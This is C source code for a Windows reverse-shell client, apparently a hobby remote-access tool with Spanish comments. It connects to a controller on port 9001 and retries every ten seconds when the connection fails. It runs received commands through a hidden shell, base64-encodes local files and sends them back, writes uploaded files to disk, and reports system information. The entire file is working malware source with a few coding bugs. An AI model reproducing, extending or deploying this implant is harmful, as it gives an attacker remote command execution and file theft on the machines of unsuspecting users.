#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <winsock2.h>
#include <windows.h>
#include <wchar.h>
#include <locale.h>
#include <shlwapi.h>
#include "../src/base64.c"
#include "../src/sysInfoWin.c"

// Definiciones
#define SOCKBUFF 2048
#define CMDBUFF 2048

// Variables Globales

// Prototipos
void conection();
void ash(int conn);
void _chdir(int conn, char *instruct);
void strtSnd(int conn, char *instruct);
int mainLoop(int conn);
int excndSend(int conn, char *cmd);
int readNdSndFle(int conn, char *file);
int uploadFunc(char *command, SOCKET conn);

int excndSend(int conn, char *cmd){
    if (strstr(cmd, "exec") != NULL){ 
        char toReplace[] = "exec ";

        char *substr = strstr(cmd, toReplace);
        size_t remainingLength = strlen(substr + strlen(toReplace));
        memmove(cmd, substr + strlen(toReplace), remainingLength + 1);

        if (strstr(cmd, "cd") != NULL){
            _chdir(conn, cmd);
            return 0;
        } 
    }
    
    FILE *xx = NULL;
    char path[1024];

    char fullCmd[CMDBUFF] = "";
    snprintf(fullCmd, sizeof(fullCmd), "%s 2>&1", cmd); 

    xx = _popen(fullCmd, "r");
    if (xx == NULL){
        char error[100] = "Error executing command...";
        send(conn, error, sizeof(error), 0);
        return 1;
    }

    while (fgets(path, sizeof(path), xx) != NULL){
        send(conn, path, strlen(path), 0);
    }

    Sleep(300);
    send(conn, "end\0", strlen("end\0"), 0);
    _pclose(xx);
    return 0;
}

void _chdir(int conn, char *instruct){
    char *directory = malloc(SOCKBUFF + 1);
    char *newDir = malloc(SOCKBUFF + 1);
    memset(directory, 0, strlen(directory));
    memset(newDir, 0, strlen(newDir));

    if (strcmp(instruct, "cd") == 0){
        GetCurrentDirectory(SOCKBUFF + 1, directory);
        send(conn, directory, strlen(directory), 0);
        send(conn, "end\0", strlen("end\0"), 0);
        return;
    }

    char toReplace[] = "cd ";

    char *substr = strstr(instruct, toReplace);
    size_t remainingLength = strlen(substr + strlen(toReplace));
    memmove(directory, substr + strlen(toReplace), remainingLength + 1);

    SetCurrentDirectory(directory);
    GetCurrentDirectory(SOCKBUFF + 1, newDir);
    send(conn, newDir, strlen(newDir), 0);
    Sleep(300);
    send(conn, "end\0", strlen("end\0"), 0);
    
    free(directory);
    free(newDir);

}

void ash(int conn)
{
    char cmd[CMDBUFF] = "";

    while (true)
    {
        recv(conn, cmd, sizeof(cmd), 0); 
        if (strcmp(cmd, "q") == 0){
            memset(cmd, 0, SOCKBUFF);
            break;
        } else if (strlen(cmd) == 0)
        {
            continue;
        } else if(strstr(cmd, "cd") != NULL){
            _chdir(conn, cmd);
            memset(cmd, 0, SOCKBUFF);
        } else {
            excndSend(conn, cmd);
            // Limpiar comando recibido
            memset(cmd, 0, SOCKBUFF);
        }
    }
    Sleep(500); 
    return;
}

void strtSnd(int conn, char *instruct){
    char *file = malloc(strlen(instruct) + 1); // Asigna memoria a 'file'
    char toReplace[] = "download ";

    char *substr = strstr(instruct, toReplace);
    size_t remainingLength = strlen(substr + strlen(toReplace));
    memmove(file, substr + strlen(toReplace), remainingLength + 1);
    readNdSndFle(conn, file);


}

int writeAndDecodeData(char *data, char *file){  
    char *base = PathFindFileName(file);   
 
    FILE *fp;
    char* DecodedData = base64_decode(data);  
    fp = fopen(base, "w");
    
    if (fp == NULL){ 
        return 1;
    }

    fprintf(fp ,"%s" ,DecodedData);
    fclose(fp);

    return 0;
    
}

int uploadFunc(char *command, SOCKET conn){
    //Variables necesarias 
    char *file = malloc(strlen(command) + 1); // Asigna memoria a 'file'
    memset(file, 0, strlen(command) + 1);
    char toReplace[] = "upload ";
    
    char *substr = strstr(command, toReplace);   
    size_t subLen = strlen(substr + strlen(toReplace));
    memmove(file, substr + strlen(toReplace), subLen);
    file[subLen] = '\0'; // Asegúrate de terminar la cadena con el carácter nulo.

    
    // Lógica para descargar archivos
    char recvData[SOCKBUFF];  // Utilizamos un búfer para recibir datos
    char *downloadedData = NULL;
    size_t downloadedSize = 0;

    // Inicializamos el búfer con valores nulos para evitar problemas con strcat
    memset(recvData, 0, sizeof(recvData));

    while (true) {
        int bytesRead = recv(conn, recvData, SOCKBUFF, 0);
         
        if (bytesRead <= 0) {
            // Manejo de error de recepción
            send(conn, "Error en la recepción de datos.\n", strlen("Error en la recepción de datos.\n"), 0);
            free(downloadedData);
            free(file);
            return 1;
        }

        if (strstr(recvData, "end\0") != NULL) {  
            // Recibido el indicador de final "end\0"
            break;
        } else { 
            // Añadir los datos recibidos al búfer de descarga
            char *temp = realloc(downloadedData, downloadedSize + bytesRead);
            if (temp == NULL) {
                // Error de memoria
                free(downloadedData);
                free(file);
                return 1;
            }
            downloadedData = temp;
            memcpy(downloadedData + downloadedSize, recvData, bytesRead);
            downloadedSize += bytesRead; 
        }
    }
 
    writeAndDecodeData(downloadedData, file);
    Sleep(300);
    send(conn, "end\0", strlen("end\0"), 0);

    free(downloadedData);
    free(file);
    return 0;
} 

int readNdSndFle(int conn, char *file){

    FILE *ptr;
    // Abrimos el archivo en modo de lectura
    ptr = fopen(file, "rb");

    if (ptr == NULL) {
        send(conn, "No se puede abrir el archivo.\n", strlen("No se puede abrir el archivo.\n"), 0);
        send(conn, "end\0", strlen("end\0"), 0);
        return 1;
    }

    char buffer[2000];  // Búfer para leer desde el archivo

    // Inicializamos los búferes con valores nulos 
    memset(buffer, 0, sizeof(buffer));

    // Lee el archivo en búferes y codifícalo en Base64 antes de enviarlo
    size_t bytesRead;

    while ((bytesRead = fread(buffer, 1, 2000, ptr) > 0)) {
        char *base64Encoded = base64_encode(buffer, strlen(buffer));

        send(conn, base64Encoded, strlen(base64Encoded), 0); 
        free(base64Encoded);  // Liberar la memoria asignada por base64_encode
    }

    // Cierra el archivo
    fclose(ptr);
    Sleep(400);
    send(conn, "end\0", strlen("end\0"), 0); 
    return 0;
}

int mainLoop(int conn){
    char instruct[SOCKBUFF];
    while (true){
        memset(instruct, 0, SOCKBUFF);
        recv(conn, instruct, sizeof(instruct), 0); 
        if (strcmp(instruct, "exit") == 0)
            return 0;
    
        else if (strcmp(instruct, "exit -y") == 0){
            exit(0);
        }
        else if (strcmp(instruct, "shell") == 0)    
            ash(conn); 
        
        else if (strstr(instruct, "download ") != NULL)
            strtSnd(conn, instruct);

        else if (strstr(instruct, "exec") != NULL)
            excndSend(conn, instruct);
            
        else if (strstr(instruct, "upload") != NULL)
            uploadFunc(instruct, conn);

        else if (strcmp(instruct, "sysinfo") == 0){
            strtAll(conn);
            send(conn, "end\0", strlen("end\0"), 0);
        
        } else
            continue;
    }
    return 0;
}

void conection()
{
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0){
        exit(1);
    }

    // Geberabanis el socket
    int conn = socket(AF_INET, SOCK_STREAM, 0);

    // Generamos estructura de datos
    struct sockaddr_in cltAddr;

    cltAddr.sin_family = AF_INET;
    cltAddr.sin_port = htons(9001); // Especifcamos puerto
    cltAddr.sin_addr.s_addr = inet_addr("127.0.0.1"); // Especifcamos IP

    int targetConnStatus = connect(conn, (struct sockaddr *)&cltAddr,
                                   sizeof(cltAddr));

    if (targetConnStatus == -1)
    {
        Sleep(10000);
        conection();
        // printf("%s[!>] %sERROR...\n", YELLOW, RED);
    }
    else
    {
        mainLoop(conn);
        Sleep(10000);
        conection();
    }
}

int main(int argc, char const *argv[])
{
    conection();
    WSACleanup(); // Clean up Winsock
    return 0;
}
